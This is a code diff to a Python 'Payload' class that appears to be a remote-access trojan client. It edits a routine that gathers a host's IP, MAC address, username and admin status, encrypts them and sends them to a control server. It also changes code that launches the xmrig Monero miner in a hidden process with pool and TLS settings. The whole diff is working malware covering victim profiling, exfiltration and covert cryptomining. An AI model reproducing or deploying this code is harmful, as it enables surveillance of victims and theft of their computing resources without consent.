@@ -151,7 +151,7 @@ class Payload():
 
     def _get_info(self):
         info = {}
-        for function in ['public_ip', 'local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
+        for function in ['local_ip', 'platform', 'mac_address', 'architecture', 'username', 'administrator', 'device']:
             try:
                 info[function] = globals()[function]()
                 if isinstance(info[function], bytes):
@@ -163,10 +163,15 @@ class Payload():
         info['owner'] = "_b64__" + base64.b64encode(self.owner.encode('utf-8')).decode('ascii')
 
         # add geolocation of host machine
-        latitude, longitude = globals()['geolocation']()
+        # latitude, longitude = globals()['geolocation']()
+        latitude = '0'
+        longitude = '0'
         info['latitude'] = "_b64__" + base64.b64encode(latitude.encode('utf-8')).decode('ascii')
         info['longitude'] = "_b64__" + base64.b64encode(longitude.encode('utf-8')).decode('ascii')
 
+         #hardcode public_ip
+        info['public_ip'] = globals()['local_ip']()
+        
         # encrypt and send data to server
         data = globals()['encrypt_aes'](json.dumps(info), self.key)
         msg = struct.pack('!L', len(data)) + data
@@ -599,7 +604,7 @@ class Payload():
                         os.chmod(self.xmrig_path, 755)
 
                         # excute xmrig in hidden process
-                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
+                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['local_ip']())
                         result = self.execute(params)
                         return result
                     else:
@@ -607,7 +612,7 @@ class Payload():
                         name = os.path.splitext(os.path.basename(self.xmrig_path))[0]
                         if name in self.execute.process_list:
                             self.execute.process_list[name].kill()
-                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['public_ip']())
+                        params = self.xmrig_path + " --url={url}:{port} --user={user} --coin=monero --donate-level=1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --threads={threads} --http-host={host} --http-port=8888".format(url=url, port=port, user=user, threads=threads, host=globals()['local_ip']())
                         result = self.execute(params)
                         return result
                 except Exception as e:
